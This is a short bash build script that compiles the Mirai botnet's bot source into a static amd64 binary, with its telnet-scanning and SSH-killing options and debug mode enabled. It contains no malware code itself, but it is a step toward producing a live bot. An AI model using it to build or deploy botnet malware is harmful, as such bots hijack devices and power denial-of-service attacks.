#!/bin/bash
MHOME="/home/kiblik/projects/Mirai-Source-Code/mirai"
gcc -std=c99 -DMIRAI_TELNET -DKILLER_REBIND_SSH -static $MHOME/bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o $MHOME/release/mirai-st -DMIRAI_BOT_ARCH=amd64 -DDEBUG
